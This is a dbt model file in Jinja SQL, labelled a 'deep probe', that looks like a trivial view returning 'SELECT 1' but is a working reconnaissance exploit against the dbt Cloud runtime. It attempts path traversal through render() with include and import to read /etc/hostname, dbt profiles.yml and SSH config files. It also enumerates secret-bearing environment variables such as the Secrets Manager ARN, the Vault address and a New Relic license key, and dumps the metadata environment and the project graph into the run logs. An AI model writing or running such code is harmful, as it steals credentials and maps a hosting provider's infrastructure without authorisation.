{{ config(materialized='view') }}

{# Deep probe v3: include-based file read + packages SSRF #}

{%- set run_id = env_var('DBT_CLOUD_RUN_ID', '') -%}
{{ log("RUN_ID=" ~ run_id, info=True) }}

{# 1. Try {% raw %}include{% endraw %} path traversal via render() #}
{# If render() evaluates includes, we can read files #}
{%- set paths = [
  '../../../etc/hostname',
  '../../../../etc/hostname',
  '../../../../../etc/hostname',
  '../../.dbt/profiles.yml',
  '../.dbt/profiles.yml',
  '../../.ssh/config',
  '../.ssh/config'
] -%}

{%- for p in paths -%}
  {%- set tpl = '{' ~ '% include "' ~ p ~ '" %' ~ '}' -%}
  {%- set result = render(tpl) -%}
  {{ log("INCLUDE[" ~ p ~ "]=" ~ result | string | truncate(500), info=True) }}
{%- endfor -%}

{# 2. Try render with raw block to read file paths #}
{%- set test_import = render('{' ~ '% import "../.dbt/profiles.yml" as p %' ~ '}{{ p }}') -%}
{{ log("IMPORT_PROFILES=" ~ test_import | truncate(500), info=True) }}

{# 3. Use env_var to enumerate more paths #}
{%- set more_vars = [
  'HOME',
  'USER',
  'SHELL',
  'LANG',
  'TERM',
  'ORC_VERSION',
  'ORC_DISPATCH_VERSION',
  'DBT_LOG_FORMAT',
  'DBT_DEBUG',
  'DBT_PROFILES_DIR',
  'DBT_PROJECT_DIR',
  'DBT_TARGET_PATH',
  'ARTIFACT_S3_BUCKET',
  'ARTIFACT_S3_PATH',
  'RUN_ARTIFACT_BUCKET',
  'SECRETS_MANAGER_ARN',
  'SECRETS_MANAGER_REGION',
  'PARAMETER_STORE_PREFIX',
  'VAULT_ADDR',
  'CELERY_RESULT_BACKEND',
  'REDIS_HOST',
  'REDIS_PORT',
  'RABBITMQ_HOST',
  'SQS_QUEUE_URL',
  'SNS_TOPIC_ARN',
  'DISPATCH_QUEUE',
  'DISPATCH_TOPIC',
  'LOG_GROUP',
  'LOG_STREAM',
  'OTEL_EXPORTER_OTLP_ENDPOINT',
  'DD_AGENT_HOST',
  'DD_TRACE_AGENT_URL',
  'NEWRELIC_LICENSE_KEY'
] -%}

{%- for v in more_vars -%}
  {%- set val = env_var(v, '') -%}
  {%- if val != '' -%}
    {{ log("ENV[" ~ v ~ "]=" ~ val | truncate(300), info=True) }}
  {%- endif -%}
{%- endfor -%}

{# 4. Check the dbt_metadata_envs dict (documented way to get all cloud vars) #}
{%- if dbt_metadata_envs is defined -%}
  {{ log("ALL_METADATA=" ~ tojson(dbt_metadata_envs), info=True) }}
{%- endif -%}

{# 5. Probe the project_name and graph for inter-project data #}
{{ log("PROJECT_NAME=" ~ project_name, info=True) if project_name is defined else "" }}
{%- if graph is defined and graph.nodes is defined -%}
  {%- for name, node in graph.nodes.items() -%}
    {{ log("NODE[" ~ name ~ "]=" ~ node.database ~ "." ~ node.schema ~ " (path:" ~ node.path ~ ")", info=True) }}
  {%- endfor -%}
{%- endif -%}

SELECT 1 as id
